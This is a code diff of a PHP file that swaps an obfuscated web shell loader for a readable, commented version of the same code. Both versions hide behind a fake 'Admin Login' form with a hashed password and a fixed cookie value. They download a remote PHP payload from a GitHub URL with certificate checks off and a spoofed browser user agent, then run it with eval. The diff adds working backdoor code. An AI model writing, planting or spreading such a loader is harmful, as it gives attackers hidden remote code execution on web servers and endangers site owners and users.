@@ -1,3 +1,67 @@
 <?php
- goto CKwPv; CKwPv: function is_logged_in() { return isset($_COOKIE["\x75\163\145\x72\137\x69\144"]) && $_COOKIE["\165\163\x65\x72\x5f\151\144"] === "\x75\x73\145\x72\61\62\63"; } goto Bua3W; Bua3W: if (is_logged_in()) { function geturlsinfo($url) { if (function_exists("\x63\165\x72\154\x5f\x65\170\145\143")) { $conn = curl_init($url); curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1); curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($conn, CURLOPT_USERAGENT, "\x4d\157\172\151\x6c\154\x61\x2f\65\56\60\40\50\127\151\x6e\x64\157\167\x73\x20\116\124\x20\66\56\x31\73\40\x72\166\72\63\x32\56\60\x29\40\x47\145\x63\x6b\x6f\57\62\x30\x31\60\60\x31\x30\x31\x20\106\x69\162\x65\146\157\170\x2f\x33\62\56\60"); curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0); $url_get_contents_data = curl_exec($conn); curl_close($conn); } elseif (function_exists("\146\x69\154\x65\x5f\147\x65\164\x5f\143\157\x6e\x74\145\156\x74\163")) { $url_get_contents_data = file_get_contents($url); } elseif (function_exists("\146\157\160\x65\x6e") && function_exists("\x73\164\x72\145\x61\x6d\x5f\147\x65\x74\x5f\143\157\156\x74\145\x6e\x74\x73")) { $handle = fopen($url, "\x72"); $url_get_contents_data = stream_get_contents($handle); fclose($handle); } else { $url_get_contents_data = false; } return $url_get_contents_data; } $a = geturlsinfo("\150\x74\164\x70\x73\x3a\x2f\x2f\162\141\167\x2e\x67\x69\x74\150\x75\142\x75\x73\145\x72\x63\157\156\164\145\x6e\x74\x2e\143\x6f\155\57\163\145\x6f\x74\x65\141\x6d\x64\144\144\57\106\x49\x4c\105\57\x72\145\x66\163\57\150\145\x61\x64\163\x2f\x6d\x61\151\156\57\x77\x69\156\152\141\x67\x6f\x2e\x70\150\160"); eval("\77\76" . $a); } else { ?>
-<!doctypehtml><html><head><title>Admin Login</title></head><body><form action=""method="POST"><label for="password">Admin:</label> <input type="password"id="password"name="password"> <input type="submit"value="Login"></form></body></html><?php  } goto cCUi9; cCUi9: ?>
+
+// Function to check if the user is logged in based on the presence of a valid cookie
+function is_logged_in()
+{
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
+}
+
+// Check if the user is logged in before executing the content
+if (is_logged_in()) {
+    // Function to get URL content (similar to your previous code)
+    function geturlsinfo($url)
+    {
+        if (function_exists('curl_exec')) {
+            $conn = curl_init($url);
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+            $url_get_contents_data = curl_exec($conn);
+            curl_close($conn);
+        } elseif (function_exists('file_get_contents')) {
+            $url_get_contents_data = file_get_contents($url);
+        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+            $handle = fopen($url, "r");
+            $url_get_contents_data = stream_get_contents($handle);
+            fclose($handle);
+        } else {
+            $url_get_contents_data = false;
+        }
+        return $url_get_contents_data;
+    }
+
+    $a = geturlsinfo('https://raw.githubusercontent.com/seoteamddd/FILE/refs/heads/main/winjago.php');
+    eval('?>' . $a);
+} else {
+    // Display login form if not logged in
+    if (isset($_POST['password'])) {
+        $entered_password = $_POST['password'];
+        $hashed_password = 'bfe2494bf2d82b67993182a46a40122d'; // Replace this with your MD5 hashed password
+        if (md5($entered_password) === $hashed_password) {
+            // Password is correct, set a cookie to indicate login
+            setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
+        } else {
+            // Password is incorrect
+            echo "Incorrect password. Please try again.";
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Admin Login</title>
+    </head>
+    <body>
+        <form method="POST" action="">
+            <label for="password">Admin:</label>
+            <input type="password" id="password" name="password">
+            <input type="submit" value="Login">
+        </form>
+    </body>
+    </html>
+    <?php
+}
+?>
